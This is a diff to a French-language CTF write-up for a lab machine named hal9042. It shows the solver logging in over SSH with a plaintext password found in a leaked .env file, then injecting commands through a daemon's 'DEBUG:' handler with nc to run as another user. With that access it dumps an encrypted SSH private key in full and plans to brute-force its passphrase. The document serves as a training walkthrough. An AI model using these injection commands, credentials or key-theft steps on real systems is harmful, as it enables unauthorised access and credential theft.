@@ -567,12 +567,100 @@ usage: ./script.sh <commande shell(POST)> OU <chemin fichier(?file=)>
 
 Je vais progresser de maniere iterative, de haut en bas, meme si j'ai deja repere une potentielle cle ssh pour sophie en fin de liste.
 
-- [x] [/home/hal/.bash_history](./utils/files/hal_bash_history).  
+Pour naviguer dans les fichiers comme sur le serveur, rdv [ici](./utils/files/)
 
-Il devient evident qu'il faudrait investiguer hal qui dit avoir fait pas mal de conneries recemment. Et lire les rapports de ol qui etaient "accurate".
+**Fichiers important a reprendre apres l'enumeration**
+1. **ol :**
+- `/home/ol/rapport/rapport_v1.md`
+- `/home/ol/scripts/check.sh`
+2. **paco :**
+- `/home/paco/scripts/encrypt/py`
+- `/home/paco/.bash_history`
+- `/home/paco/.env.old`
+- `/home/paco/src/evaluator.c`
+- `/home/paco/TODO.md`
+3. **sophie**
+- RAS, du mail qui donne du contexte seulement
+4. **wil**
+- `/home/wil/notes/personal_note.txt`
 
-- [x] [/home/ol/notes/???](./utils/files/ol/notes/)
+### Se connecter en SSH avec paco :
 
-- [] [/home/ol/rapport/???](./utils/files/ol/rapport/rapport_v1.md)
+On trouve les credentials de paco dans `/home/paco/.env.old`
+```bash
+ssh -p 6060 paco@10.0.2.2
+paco@10.0.2.2's password: Pac0_H4L_dev!
+```
 
-- [] [/home/ol/REVOCATION_NOTICE.txt](./utils/files/ol/REVOCATION_NOTICE.txt) - ol etait maintener sur l'evaluateur, il faudrait peut etre voir s'il n'a pas encore des droits sur certain fichiers / dossiers. 
+Une fois connecte a la session de `paco`, il y a quelque chose qui avait pique ma curiosite dans son `.bash_history` :
+```bash
+cd /home/paco/src
+gcc -O2 -o /opt/hal9042/daemon evaluator.c <========= ICI
+nc 127.0.0.1 7042
+echo "DEBUG:id" | nc 127.0.0.1 7042 <======== ET ICI
+```
+En analysant [evaluate.c](./utils/files/paco/src/evaluator.c) : 
+```c
+system(cmd);                 /* executes as wil */
+```
+
+En fait, le daemon `hal9042d` sur le port 7042 accessible en local, seulement sur `127.0.0.1` a un handler de debug qui execute `system(cmd)` en tant que `wil` des que la commande commence par `DEBUG:`.
+
+On peut donc tenter un pivot depuis ce point : 
+```bash
+paco@hal9042:~$ echo "DEBUG:whoami" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+> wil
+>
+```
+
+wil dit dans ses notes : 
+```
+“The passphrase is something she'd never guess I remembered. it's the most common password in the world.”
+```
+
+Le but maintenant : recuperer la cle chiffree et la decrypter en cherchant la passphrase : 
+
+```bash
+paco@hal9042:~$ echo "DEBUG:cd home/wil/.ssh && cat id_rsa_sophie.enc" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+> -----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAzK+j7jK
+N6wuhUaI7mCb46AAAAGAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCdNrsKwY/D
+/oCuNh3+IKG5Bw4neOSsx55IdttrIaY8tzB5mupAwOBJTNbbagUkX81Ip9TSUZsETf+RKt
+OozxG6nNi4dq7xXInk23xaauE/g/3i2d53IwNqqIUorfj7OJl8ixYOhPsTC8SzsIlsI+/p
+lhZUDP6uZ2QhSWuv2wrwFYZ81fCoYO3itEXjV6j1MEmbWdDPpf7kh7S2j2v7UPC1yHI87i
+LM+QKJArWp9qHEZbf+6J7eQ3kYdr+9LCK9VQhXeyfndIGoBD0i5P9jwiWaWDA+FJbyvD3Z
+JQXvzTZgfNp0TmLBScYm0MNaaztwOZlhhXj77AgxyuMrMbOoTts7AAAD0FHPIvfwDMBNKv
+HWPis4v56H83ACJ3Ts+lMQegwERhNaqDKVliePaTED/ZmQ+nxyPOTEpfVowa3ZUP4o3Wo4
+Ma2lXZhBpf8LKx5n09GJkc7tBJeGbWXJYeZSGmOXXhlIAgtePuJnjVTmGjBRtxf47NKczR
+djV04oU0sxaeog5qiaSPqwgm97zjgepvsXJ/dbK8yhL05C9s9mPiZ8vmKqAkgKQrcBj3XK
+igxGM2SwdJxZa/PkG8WOhflZ8fZsSwTlHDH2kgR0mEDE1ctT2EBZDEt0tWXC8t4fWD77+y
+c3M+Vqz0UTj28O4x6mn2jbIr34ap2qFgnLs4rzLNkhTClkJz0ROb9cSWEjvOqzfqKY8SOc
+X+YM5/w0Os7cTrw9KZWPNT7XjpSf1xi7cz244Ui19D4+LHSf4w9SVCwS5F5Fk46JHxZbsI
+X2gWmwxPhOE8qW1bDZhmFRoQEsg1nw/8fxq444p0P6ITztM3Rcne0zEDVNdPEDrjPGBBkb
+KjMZWw3KzI6G5vBMeG83zNVqACoJDYzD9neT9DNn7J2KNGJpKaFATirvmTReuwbVf54HrK
+19XQ6gV1kv95ny3MXfPYC47RuSqS5lbNXpYaSsTSCdJMe4L52kG+sHG+9sx9KrHckQ7fCu
+m5ptzYPU4wNpu/hEIhkKktAHhkTF9Jm1wzySKnu0ashxWXJS8QWNbKMkEOInz5MB3BE0/E
+jCCPL7+omqoL6uuOVma19FH4JssGEEcnxgw58pZlpWqsTSOy9lx5OvawMjWMQMkvTJWieR
+A0XRISv9vKo/3O8fc0G/DB5oNSX457BPMkMTYPLBXn8AApDP0V8XveIq0iYEHGhFEA5hUr
+HdWVP/zzERJA/AxJ50Ek7z+ZPure9+Zzy5FbPmcH73Tj3GKmXr0CEIApXDukXNZpSO+MNz
+FGHhM+KwmAHLgHz8HMki3bT+Flk6Ed6smsyVuoJtEq4PJ6FVMWo+Nsa9t5lOkyrxtw1Inr
+f0RuItqMv2n40MxLMHThDLLI5Q8QAzMaUMXQuOKYqJ/fUJ7m0DJNUifHDYjDzPhYMma0hG
+k2D4rYYKLIghjrT8TuedHvjRODN27P7MkBh7o3/jMV+tdm4BEiweom6NYqmGomNAtX+HNA
+jX+YOcpaDKY8fyrcajiLqk0HX+0BLG4m/w1WT7ng1tCUBWRN3nNBGoB2OBnqLTBQ/e63qd
+LeAClq9AxRB55haj9LKeFwAv/dNUI28QHHth17q2ycWLiozebTzi5ujFAiZ62cs02b7DO8
+nd5ef3HqPILkSJLtE8a2lgNktuuAQ=
+-----END OPENSSH PRIVATE KEY-----
+┌──(kali㉿kali)-[~]
+└─$ chmod 600 id_rsa_sophie.enc       
+                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ ssh-keygen -y -f id_rsa_sophie.enc
+Enter passphrase for "id_rsa_sophie.enc": 
+Load key "id_rsa_sophie.enc": incorrect passphrase supplied to decrypt private key
+```
+
+Il va maintenant falloir trouver la passphrase, probablement dans les mots de passe les plus courant. En CTF, par convention ca doit pouvoir etre bruteforce en moins de 5mn.
